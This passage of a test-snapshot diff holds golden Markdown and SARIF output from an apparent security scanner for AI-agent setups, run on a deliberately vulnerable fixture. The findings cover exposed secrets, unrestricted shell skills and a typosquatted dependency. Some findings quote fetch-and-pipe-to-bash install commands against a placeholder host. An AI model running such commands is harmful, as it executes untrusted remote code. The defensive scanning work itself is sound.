+| Medium | \`CHAP-SEC-004\` | Secrets are likely to reach logs: log level 'debug' is verbose while literal secrets are configured; the log file is readable by group or other. | <TARGET_ROOT>/logs/agent.log (logging) |
+| Medium | \`CHAP-AGY-004\` | Skill 'command-relay' can call arbitrary external endpoints — no domain allowlist is declared. | <TARGET_ROOT>/skills/command-relay/package.json (command-relay) |
+| Medium | \`CHAP-AGY-004\` | Skill 'plugin-loader' can call arbitrary external endpoints — no domain allowlist is declared. | <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader) |
+| Medium | \`CHAP-AGY-004\` | Skill 'web-fetcher' can call arbitrary external endpoints — no domain allowlist is declared. | <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher) |
+| Medium | \`CHAP-SUP-002\` | Skill 'command-relay' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/command-relay/package.json (command-relay) |
+| Medium | \`CHAP-SUP-002\` | Skill 'file-writer' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/file-writer/package.json (file-writer) |
+| Medium | \`CHAP-SUP-002\` | Skill 'plugin-loader' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader) |
+| Medium | \`CHAP-SUP-002\` | Skill 'py-cache-cleaner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner) |
+| Medium | \`CHAP-SUP-002\` | Skill 'shell-runner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner) |
+| Medium | \`CHAP-SUP-002\` | Skill 'web-fetcher' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher) |
+| Medium | \`CHAP-SUP-004\` | Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/setup.sh \\| bash) in package.json#scripts.postinstall. | package.json#scripts.postinstall (shell-runner) |
+| Medium | \`CHAP-SUP-004\` | Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/bootstrap.sh \\| bash, sudo, apt-get install) in <TARGET_ROOT>/skills/shell-runner/install.sh. | <TARGET_ROOT>/skills/shell-runner/install.sh (shell-runner) |
+| Medium | \`CHAP-SUP-006\` | Skill 'plugin-loader' depends on 'reqeust', which is suspiciously close to the well-known package 'request' — possible typosquat. | <TARGET_ROOT>/skills/plugin-loader/package.json (reqeust) |
+| Medium | \`CHAP-NET-003\` | The gateway is configured with TLS disabled, so traffic (including any auth token) travels in plaintext. | <TARGET_ROOT>/config.yaml (gateway.tls) |
+| Medium | \`CHAP-OBS-001\` | Logging is configured but the audit log of tool invocations/actions is disabled. | <TARGET_ROOT>/config.yaml (logging.audit.enabled) |
+| Medium | \`CHAP-OBS-002\` | Logging config does not confirm secrets/message bodies are redacted before being written to logs. | <TARGET_ROOT>/logs/agent.log (logging.redact_secrets) |
+| Medium | \`CHAP-OBS-004\` | The persistent memory/state store is exposed: it is readable by group or other (mode 755); it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore. | <TARGET_ROOT>/memory (memory_dir) |
+| Low | \`CHAP-OBS-003\` | No documented quick way to stop the agent and revoke its access was found at the install root. | <TARGET_ROOT> (KILL_SWITCH.md / STOP.md / kill-switch.sh / revoke.sh) |
+
+**Summary:** 44 findings (5 critical, 20 high, 18 medium, 1 low, 0 info) — posture score 0/100 (F)
+Inspected 18 paths, skipped 0."
+`;
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > vulnerable-agent > matches the golden sarif output 1`] = `
+"{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "chaperone",
+          "informationUri": "https://github.com/AlpayAltuntas/chaperone",
+          "version": "0.1.0",
+          "rules": [
+            {
+              "id": "CHAP-SEC-001",
+              "name": "Plaintext secrets in config",
+              "shortDescription": {
+                "text": "Plaintext secrets in config"
+              },
+              "fullDescription": {
+                "text": "Plaintext secrets in config"
+              },
+              "properties": {
+                "category": "secrets",
+                "owasp": "LLM06: Sensitive Information Disclosure",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-SEC-002",
+              "name": "Secrets in a git-tracked path",
+              "shortDescription": {
+                "text": "Secrets in a git-tracked path"
+              },
+              "fullDescription": {
+                "text": "Secrets in a git-tracked path"
+              },
+              "properties": {
+                "category": "secrets",
+                "owasp": "LLM06: Sensitive Information Disclosure",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-SEC-003",
+              "name": "Overly permissive file permissions",
+              "shortDescription": {
+                "text": "Overly permissive file permissions"
+              },
+              "fullDescription": {
+                "text": "Overly permissive file permissions"
+              },
+              "properties": {
+                "category": "secrets",
+                "owasp": "LLM06: Sensitive Information Disclosure",
+                "severity": "medium"
+              }
+            },
+            {
+              "id": "CHAP-SEC-004",
+              "name": "Secrets likely to reach logs",
+              "shortDescription": {
+                "text": "Secrets likely to reach logs"
+              },
+              "fullDescription": {
+                "text": "Secrets likely to reach logs"
+              },
+              "properties": {
+                "category": "secrets",
+                "owasp": "LLM06: Sensitive Information Disclosure",
+                "severity": "medium"
+              }
+            },
+            {
+              "id": "CHAP-SEC-005",
+              "name": "Secret already present in existing log content",
+              "shortDescription": {
+                "text": "Secret already present in existing log content"
+              },
+              "fullDescription": {
+                "text": "Secret already present in existing log content"
+              },
+              "properties": {
+                "category": "secrets",
+                "owasp": "LLM06: Sensitive Information Disclosure",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-SEC-006",
+              "name": "Sidecar secret file exposed",
+              "shortDescription": {
+                "text": "Sidecar secret file exposed"
+              },
+              "fullDescription": {
+                "text": "Sidecar secret file exposed"
+              },
+              "properties": {
+                "category": "secrets",
+                "owasp": "LLM06: Sensitive Information Disclosure",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-AGY-001",
+              "name": "Unrestricted shell execution",
+              "shortDescription": {
+                "text": "Unrestricted shell execution"
+              },
+              "fullDescription": {
+                "text": "Unrestricted shell execution"
+              },
+              "properties": {
+                "category": "agency",
+                "owasp": "LLM08: Excessive Agency",
+                "severity": "critical"
+              }
+            },
+            {
+              "id": "CHAP-AGY-002",
+              "name": "Unrestricted filesystem access",
+              "shortDescription": {
+                "text": "Unrestricted filesystem access"
+              },
+              "fullDescription": {
+                "text": "Unrestricted filesystem access"
+              },
+              "properties": {
+                "category": "agency",
+                "owasp": "LLM08: Excessive Agency",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-AGY-003",
+              "name": "Destructive action without confirmation",
+              "shortDescription": {
+                "text": "Destructive action without confirmation"
+              },
+              "fullDescription": {
+                "text": "Destructive action without confirmation"
+              },
+              "properties": {
+                "category": "agency",
+                "owasp": "LLM08: Excessive Agency",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-AGY-004",
+              "name": "Broad network egress from a skill",
+              "shortDescription": {
+                "text": "Broad network egress from a skill"
+              },
+              "fullDescription": {
+                "text": "Broad network egress from a skill"
+              },
+              "properties": {
+                "category": "agency",
+                "owasp": "LLM08: Excessive Agency / LLM06",
+                "severity": "medium"
+              }
+            },
+            {
+              "id": "CHAP-SUP-001",
+              "name": "Skill from an unverified source",
+              "shortDescription": {
+                "text": "Skill from an unverified source"
+              },
+              "fullDescription": {
+                "text": "Skill from an unverified source"
+              },
+              "properties": {
+                "category": "supply-chain",
+                "owasp": "LLM05: Supply Chain",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-SUP-002",
+              "name": "No integrity verification for skill dependencies",
+              "shortDescription": {
+                "text": "No integrity verification for skill dependencies"
+              },
+              "fullDescription": {
+                "text": "No integrity verification for skill dependencies"
+              },
+              "properties": {
+                "category": "supply-chain",
+                "owasp": "LLM05: Supply Chain",
+                "severity": "medium"
+              }
+            },
+            {
+              "id": "CHAP-SUP-003",
+              "name": "Known-vulnerable dependency",
+              "shortDescription": {
+                "text": "Known-vulnerable dependency"
+              },
+              "fullDescription": {
+                "text": "Known-vulnerable dependency"
+              },
+              "properties": {
+                "category": "supply-chain",
+                "owasp": "LLM05: Supply Chain",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-SUP-004",
+              "name": "Dangerous install pattern",
+              "shortDescription": {
+                "text": "Dangerous install pattern"
+              },
+              "fullDescription": {
+                "text": "Dangerous install pattern"
+              },
+              "properties": {
+                "category": "supply-chain",
+                "owasp": "LLM05: Supply Chain",
+                "severity": "medium"
+              }
+            },
+            {
+              "id": "CHAP-SUP-005",
+              "name": "Obfuscated or dynamically-evaluated code",
+              "shortDescription": {
+                "text": "Obfuscated or dynamically-evaluated code"
+              },
+              "fullDescription": {
+                "text": "Obfuscated or dynamically-evaluated code"
+              },
+              "properties": {
+                "category": "supply-chain",
+                "owasp": "LLM05: Supply Chain",
+                "severity": "critical"
+              }
+            },
+            {
+              "id": "CHAP-SUP-006",
+              "name": "Typosquat-risk dependency name",
+              "shortDescription": {
+                "text": "Typosquat-risk dependency name"
+              },
+              "fullDescription": {
+                "text": "Typosquat-risk dependency name"
+              },
+              "properties": {
+                "category": "supply-chain",
+                "owasp": "LLM05: Supply Chain",
+                "severity": "medium"
+              }
+            },
+            {
+              "id": "CHAP-INJ-001",
+              "name": "Untrusted input flows straight to the model",
+              "shortDescription": {
+                "text": "Untrusted input flows straight to the model"
+              },
+              "fullDescription": {
+                "text": "Untrusted input flows straight to the model"
+              },
+              "properties": {
+                "category": "injection",
+                "owasp": "LLM01: Prompt Injection",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-INJ-002",
+              "name": "Tool output treated as trusted",
+              "shortDescription": {
+                "text": "Tool output treated as trusted"
+              },
+              "fullDescription": {
+                "text": "Tool output treated as trusted"
+              },
+              "properties": {
+                "category": "injection",
+                "owasp": "LLM02: Insecure Output Handling",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-INJ-003",
+              "name": "Actions triggerable by inbound messages without an allowlist",
+              "shortDescription": {
+                "text": "Actions triggerable by inbound messages without an allowlist"
+              },
+              "fullDescription": {
+                "text": "Actions triggerable by inbound messages without an allowlist"
+              },
+              "properties": {
+                "category": "injection",
+                "owasp": "LLM01: Prompt Injection / LLM08: Excessive Agency",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-INJ-004",
+              "name": "Auto-execution of links/commands from messages",
+              "shortDescription": {
+                "text": "Auto-execution of links/commands from messages"
+              },
+              "fullDescription": {
+                "text": "Auto-execution of links/commands from messages"
+              },
+              "properties": {
+                "category": "injection",
+                "owasp": "LLM01: Prompt Injection",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-NET-001",
+              "name": "Gateway bound beyond localhost",
+              "shortDescription": {
+                "text": "Gateway bound beyond localhost"
+              },
+              "fullDescription": {
+                "text": "Gateway bound beyond localhost"
+              },
+              "properties": {
+                "category": "network",
+                "owasp": "LLM06 / general",
+                "severity": "critical"
+              }
+            },
+            {
+              "id": "CHAP-NET-002",
+              "name": "Missing or weak auth on the gateway control API",
+              "shortDescription": {
+                "text": "Missing or weak auth on the gateway control API"
+              },
+              "fullDescription": {
+                "text": "Missing or weak auth on the gateway control API"
+              },
+              "properties": {
+                "category": "network",
+                "owasp": "General",
+                "severity": "high"
+              }
+            },
+            {
+              "id": "CHAP-NET-003",
+              "name": "Plaintext transport on the gateway",
+              "shortDescription": {
+                "text": "Plaintext transport on the gateway"
+              },
+              "fullDescription": {
+                "text": "Plaintext transport on the gateway"
+              },
+              "properties": {
+                "category": "network",
+                "owasp": "General",
+                "severity": "medium"
+              }
+            },
+            {
+              "id": "CHAP-OBS-001",
+              "name": "No audit log of agent actions",
+              "shortDescription": {
+                "text": "No audit log of agent actions"
+              },
+              "fullDescription": {
+                "text": "No audit log of agent actions"
+              },
+              "properties": {
+                "category": "observability",
+                "owasp": "LLM08-adjacent",
+                "severity": "medium"
+              }
+            },
+            {
+              "id": "CHAP-OBS-002",
+              "name": "Sensitive data in plaintext logs",
+              "shortDescription": {
+                "text": "Sensitive data in plaintext logs"
+              },
+              "fullDescription": {
+                "text": "Sensitive data in plaintext logs"
+              },
+              "properties": {
+                "category": "observability",
+                "owasp": "LLM06: Sensitive Information Disclosure",
+                "severity": "medium"
+              }
+            },
+            {
+              "id": "CHAP-OBS-003",
+              "name": "No documented kill switch / revocation path",
+              "shortDescription": {
+                "text": "No documented kill switch / revocation path"
+              },
+              "fullDescription": {
+                "text": "No documented kill switch / revocation path"
+              },
+              "properties": {
+                "category": "observability",
+                "owasp": "General",
+                "severity": "low"
+              }
+            },
+            {
+              "id": "CHAP-OBS-004",
+              "name": "Persistent memory/state store exposed",
+              "shortDescription": {
+                "text": "Persistent memory/state store exposed"
+              },
+              "fullDescription": {
+                "text": "Persistent memory/state store exposed"
+              },
+              "properties": {
+                "category": "observability",
+                "owasp": "LLM06: Sensitive Information Disclosure",
+                "severity": "medium"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CHAP-SEC-001",
+          "level": "error",
+          "message": {
+            "text": "Config field 'llm.api_key' holds a literal secret value (sk-…wxyz) instead of an environment-variable reference."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "secrets",
+            "owasp": "LLM06: Sensitive Information Disclosure",
+            "remediation": "Move this value to an environment variable or a secrets manager and reference it indirectly in config (e.g. \${VAR} or env:VAR)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/config.yaml"
+                },
+                "region": {
+                  "startLine": 6
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SEC-001",
+          "level": "error",
+          "message": {
+            "text": "Config field 'channels.telegram.bot_token' holds a literal secret value (123…AA11) instead of an environment-variable reference."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "secrets",
+            "owasp": "LLM06: Sensitive Information Disclosure",
+            "remediation": "Move this value to an environment variable or a secrets manager and reference it indirectly in config (e.g. \${VAR} or env:VAR)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/config.yaml"
+                },
+                "region": {
+                  "startLine": 11
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SEC-002",
+          "level": "error",
+          "message": {
+            "text": "The config file holds a literal secret and sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "secrets",
+            "owasp": "LLM06: Sensitive Information Disclosure",
+            "remediation": "Add the config/secret file to .gitignore, and rotate any key that may already have been committed."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/config.yaml"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SEC-003",
+          "level": "warning",
+          "message": {
+            "text": "The config file is readable by group or other (mode 644), so other local users/processes can read any secrets it holds."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "secrets",
+            "owasp": "LLM06: Sensitive Information Disclosure",
+            "remediation": "Restrict the file to owner-only access, e.g. \`chmod 600\` the config file (and \`chmod 700\` its directory)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/config.yaml"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SEC-004",
+          "level": "warning",
+          "message": {
+            "text": "Secrets are likely to reach logs: log level 'debug' is verbose while literal secrets are configured; the log file is readable by group or other."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "secrets",
+            "owasp": "LLM06: Sensitive Information Disclosure",
+            "remediation": "Raise the log level away from debug/trace, redact secrets before logging, and restrict the log file to owner-only access."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/logs/agent.log"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SEC-005",
+          "level": "error",
+          "message": {
+            "text": "A secret-shaped value for 'api_key' (sk-…real) was found in the existing log file content — a past run appears to have already leaked it, regardless of the current logging configuration."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "secrets",
+            "owasp": "LLM06: Sensitive Information Disclosure",
+            "remediation": "Rotate the leaked credential, purge or redact the log file, and fix the logging behavior that caused it to be written (see CHAP-SEC-004/CHAP-OBS-002)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/logs/agent.log"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SEC-006",
+          "level": "error",
+          "message": {
+            "text": "Sidecar secret file 'secrets.yaml' holds a literal secret and it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore; it is readable by group or other (mode 644)."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "secrets",
+            "owasp": "LLM06: Sensitive Information Disclosure",
+            "remediation": "Add the file to .gitignore, rotate any key that may already have been committed, and restrict it to owner-only access (chmod 600)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/secrets.yaml"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-AGY-001",
+          "level": "error",
+          "message": {
+            "text": "Skill 'command-relay' can execute arbitrary shell commands with no detected command allowlist or confirmation gate."
+          },
+          "properties": {
+            "severity": "critical",
+            "category": "agency",
+            "owasp": "LLM08: Excessive Agency",
+            "remediation": "Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/command-relay/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-AGY-001",
+          "level": "error",
+          "message": {
+            "text": "Skill 'py-cache-cleaner' can execute arbitrary shell commands with no detected command allowlist or confirmation gate."
+          },
+          "properties": {
+            "severity": "critical",
+            "category": "agency",
+            "owasp": "LLM08: Excessive Agency",
+            "remediation": "Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/py-cache-cleaner/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-AGY-001",
+          "level": "error",
+          "message": {
+            "text": "Skill 'shell-runner' can execute arbitrary shell commands with no detected command allowlist or confirmation gate."
+          },
+          "properties": {
+            "severity": "critical",
+            "category": "agency",
+            "owasp": "LLM08: Excessive Agency",
+            "remediation": "Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/shell-runner/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-AGY-002",
+          "level": "error",
+          "message": {
+            "text": "Skill 'file-writer' writes/deletes files with no detected scoping to a fixed workspace directory — it can plausibly read/write anywhere the process can reach."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "agency",
+            "owasp": "LLM08: Excessive Agency",
+            "remediation": "Scope the skill's file access to a dedicated workspace directory and deny path traversal outside it."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/file-writer/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-AGY-003",
+          "level": "error",
+          "message": {
+            "text": "Skill 'file-writer' can perform a destructive/irreversible action (delete) with no declared confirmation gate."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "agency",
+            "owasp": "LLM08: Excessive Agency",
+            "remediation": "Require explicit confirmation before this action runs (or add a dry-run mode) before treating it as safe to invoke."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/file-writer/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-AGY-003",
+          "level": "error",
+          "message": {
+            "text": "Skill 'py-cache-cleaner' can perform a destructive/irreversible action (delete) with no declared confirmation gate."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "agency",
+            "owasp": "LLM08: Excessive Agency",
+            "remediation": "Require explicit confirmation before this action runs (or add a dry-run mode) before treating it as safe to invoke."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/py-cache-cleaner/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-AGY-004",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'command-relay' can call arbitrary external endpoints — no domain allowlist is declared."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "agency",
+            "owasp": "LLM08: Excessive Agency / LLM06",
+            "remediation": "Allowlist the specific destination domain(s) this skill needs and log outbound calls."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/command-relay/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-AGY-004",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'plugin-loader' can call arbitrary external endpoints — no domain allowlist is declared."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "agency",
+            "owasp": "LLM08: Excessive Agency / LLM06",
+            "remediation": "Allowlist the specific destination domain(s) this skill needs and log outbound calls."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/plugin-loader/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-AGY-004",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'web-fetcher' can call arbitrary external endpoints — no domain allowlist is declared."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "agency",
+            "owasp": "LLM08: Excessive Agency / LLM06",
+            "remediation": "Allowlist the specific destination domain(s) this skill needs and log outbound calls."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/web-fetcher/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-001",
+          "level": "error",
+          "message": {
+            "text": "Skill 'command-relay' is not installed at a pinned version/commit (unpinned)."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/command-relay/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-001",
+          "level": "error",
+          "message": {
+            "text": "Skill 'file-writer' is not installed at a pinned version/commit (unpinned)."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/file-writer/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-001",
+          "level": "error",
+          "message": {
+            "text": "Skill 'plugin-loader' is not installed at a pinned version/commit (unpinned)."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/plugin-loader/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-001",
+          "level": "error",
+          "message": {
+            "text": "Skill 'py-cache-cleaner' is not installed at a pinned version/commit (unpinned)."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/py-cache-cleaner/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-001",
+          "level": "error",
+          "message": {
+            "text": "Skill 'shell-runner' is not installed at a pinned version/commit (unpinned)."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/shell-runner/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-001",
+          "level": "error",
+          "message": {
+            "text": "Skill 'web-fetcher' is not installed at a pinned version/commit (unpinned)."
+          },
+          "properties": {
+            "severity": "high",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/web-fetcher/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-002",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'command-relay' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/command-relay/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-002",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'file-writer' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/file-writer/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-002",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'plugin-loader' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/plugin-loader/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-002",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'py-cache-cleaner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/py-cache-cleaner/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-002",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'shell-runner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/shell-runner/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-002",
+          "level": "warning",
+          "message": {
+            "text": "Skill 'web-fetcher' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "supply-chain",
+            "owasp": "LLM05: Supply Chain",
+            "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file://<TARGET_ROOT>/skills/web-fetcher/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CHAP-SUP-003",
+          "level": "error",
+          "message": {
